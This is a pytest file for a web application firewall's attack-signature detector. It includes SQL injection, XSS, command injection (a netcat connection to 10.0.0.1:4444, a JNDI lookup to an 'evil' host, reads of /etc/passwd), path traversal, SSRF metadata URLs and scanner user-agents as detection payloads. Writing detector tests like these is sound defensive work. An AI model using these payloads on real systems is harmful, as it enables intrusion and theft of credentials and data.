"""攻击特征检测 (signatures) 测试."""
from __future__ import annotations

import pytest

from sentinel.waf import signatures as S


@pytest.mark.parametrize("payload", [
    "1' OR '1'='1", "1 OR 1=1", "1) OR (1=1", "admin'--", "' OR 'x'='x",
    "1 UNION SELECT user,pass FROM users", "1;DROP TABLE users--",
    "1 AND SLEEP(5)", "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1 ORDER BY 5", "SELECT * FROM information_schema.tables",
])
def test_sqli_payloads_detected(payload):
    hits = S.detect(payload, ["sqli"])
    assert hits or S.looks_like_sqli(payload)


@pytest.mark.parametrize("payload", [
    "select the best laptop for students", "order by popularity",
    "how to select a camera", "drop in the bucket lyrics",
    "where is my package", "union station opening hours",
    "1 or 2 items available", "a=b and c=d", "javascript basics for beginners",
])
def test_sqli_benign_phrases_not_flagged(payload):
    assert not S.detect(payload, ["sqli"]) and not S.looks_like_sqli(payload)


@pytest.mark.parametrize("payload", [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>", "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>", "&#x3c;script&#x3e;alert(1)",
    "\"><script>alert(document.cookie)</script>",
])
def test_xss_detected(payload):
    assert S.detect(payload, ["xss"]) or S.looks_like_xss(payload)


@pytest.mark.parametrize("payload", [
    "script writing tips", "javascript basics", "select your seat",
    "the <b>bold</b> tag in html", "email: a@b.com",
])
def test_xss_benign_not_flagged(payload):
    assert not S.detect(payload, ["xss"]) and not S.looks_like_xss(payload)


@pytest.mark.parametrize("payload", [
    "127.0.0.1;cat /etc/passwd", "|whoami", "$(id)", "`uname -a`",
    "${jndi:ldap://evil/a}", "system('ls')", "127.0.0.1 && nc 10.0.0.1 4444",
])
def test_rce_detected(payload):
    assert S.detect(payload, ["rce"])


@pytest.mark.parametrize("payload", [
    "../../../../etc/passwd", "..\\..\\windows\\win.ini", "/etc/shadow",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "file:///etc/passwd", "/WEB-INF/web.xml", "/proc/self/environ",
])
def test_lfi_detected(payload):
    assert S.detect(payload, ["lfi"])


@pytest.mark.parametrize("payload", [
    "http://127.0.0.1:8080/admin", "http://localhost/", "http://169.254.169.254/",
    "http://10.0.0.5/x", "http://192.168.1.1/", "gopher://127.0.0.1:6379/_INFO",
    "http://metadata.google.internal/",
])
def test_ssrf_detected(payload):
    assert S.detect(payload, ["ssrf"])


@pytest.mark.parametrize("agent", [
    "sqlmap/1.7", "Nikto/2.5", "Nmap Scripting Engine", "masscan/1.3",
    "nuclei", "Acunetix", "w3af", "W13Scan", "gobuster/3.6", "zgrab/0.x",
])
def test_scanner_fingerprints(agent):
    assert S.detect(agent, ["scanner"])


def test_detect_returns_category_and_snippet():
    hits = S.detect("1 UNION SELECT 1,2--", ["sqli"])
    assert hits
    assert hits[0].category == "sqli"
    assert hits[0].tag.startswith("sqli.")
    assert hits[0].snippet


def test_scan_request_parts_covers_all_fields():
    parts = {"q": "1 OR 1=1", "ua": "sqlmap/1.7", "clean": "hello"}
    result = S.scan_request_parts(parts)
    assert result["q"] and result["ua"]
    assert "clean" in result and result["clean"] == []


def test_empty_inputs_are_safe():
    assert S.detect("") == []
    assert S.looks_like_sqli("") is False
    assert S.looks_like_xss("") is False
